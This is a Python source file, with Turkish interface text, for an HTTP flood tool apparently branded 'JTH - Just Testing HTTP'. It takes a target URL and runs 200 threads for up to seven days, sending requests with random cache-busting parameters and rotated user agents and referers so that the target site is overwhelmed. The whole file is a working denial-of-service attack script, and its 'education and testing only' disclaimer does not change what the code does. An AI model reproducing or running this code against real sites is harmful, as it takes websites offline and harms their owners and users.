import os
import sys
import time
import threading
import random
import re
import urllib.request
from colorama import Fore, Style, init

init(autoreset=True)

# Global değişkenler
url = ''
host = ''
request_counter = 0
flag = 0
safe = 0
days = 1
headers_useragents = []
headers_referers = []

def show_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + Style.BRIGHT + " "*22 + "JTH - Just Testing HTTP")
    print(Fore.CYAN + "="*60)
    print(Fore.GREEN + " Instagram : " + Fore.WHITE + "@jth_joker")
    print(Fore.GREEN + " Telegram  : " + Fore.WHITE + "t.me/joker_jth")
    print(Fore.GREEN + " Kurucu    : " + Fore.WHITE + "JOKER")
    print(Fore.GREEN + " Adminler  : " + Fore.WHITE + "EgeCin, infaz can, kuralsız")
    print(Fore.CYAN + "-"*60)
    print(Fore.MAGENTA + " Bu araç yalnızca eğitim ve test amaçlı geliştirilmiştir.")
    print(Fore.RED + " Yetkisiz kullanım kesinlikle yasaktır.")
    print(Fore.CYAN + "-"*60)

def useragent_list():
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (X11; Linux x86_64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)',
        'Mozilla/5.0 (Windows NT 6.1; WOW64)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
    ]

def referer_list():
    global headers_referers
    headers_referers = [
        'http://www.google.com/?q=',
        'http://www.bing.com/search?q=',
        'http://search.yahoo.com/search?p=',
        'http://www.duckduckgo.com/?q=',
    ]

def buildblock(size):
    return ''.join([chr(random.randint(65, 90)) for _ in range(size)])

def get_url():
    while True:
        u = input(Fore.YELLOW + "\nHedef URL'yi girin (http:// veya https:// ile): " + Fore.WHITE)
        if u.startswith("http://") or u.startswith("https://"):
            return u
        else:
            print(Fore.RED + "URL GİRİNİZ")

def select_days():
    print(Fore.YELLOW + "\nKaç gün boyunca test yapılacak? (1-7)")
    while True:
        try:
            d = int(input(Fore.WHITE + "Gün: "))
            if 1 <= d <= 7:
                return d
            else:
                print(Fore.RED + "1 ile 7 arasında bir sayı girin.")
        except:
            print(Fore.RED + "Geçerli bir sayı girin.")

def httpcall(url):
    global headers_useragents, headers_referers, host
    if "?" in url:
        param_joiner = "&"
    else:
        param_joiner = "?"
    req_url = url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10))
    request = urllib.request.Request(req_url)
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', str(random.randint(110,120)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib.request.urlopen(request)
    except:
        return 500
    return 0

class HTTPThread(threading.Thread):
    def run(self):
        global flag, request_counter
        while flag < 2:
            code = httpcall(url)
            if code == 500 and safe == 1:
                flag = 2
            request_counter += 1

class MonitorThread(threading.Thread):
    def run(self):
        global request_counter, flag, days
        previous = 0
        start_time = time.time()
        total_seconds = days * 86400
        while flag == 0:
            elapsed = time.time() - start_time
            if elapsed >= total_seconds:
                print(Fore.GREEN + "\n-- Süre doldu. JTH Saldırı Bitti --")
                flag = 2
                break
            if request_counter > previous:
                print(Fore.CYAN + f"Ataklar: {request_counter} | Geçersiz: {flag} | Kalan Süre: {int(total_seconds - elapsed)} sn")
                previous = request_counter
            time.sleep(1)

def start_attack():
    global url, host
    m = re.search('(https?://)?([^/]+)', url)
    if m:
        host = m.group(2)
    else:
        print(Fore.RED + "Geçersiz URL!")
        return
    print(Fore.CYAN + "\n-- Saldırı Başlatılıyor... --")
    useragent_list()
    referer_list()
    for _ in range(200):  # thread sayısı
        t = HTTPThread()
        t.start()
    monitor = MonitorThread()
    monitor.start()

# ANA AKIŞ
show_logo()
url = get_url()
days = select_days()
safe = 0  # süre bitince duracak
start_attack()
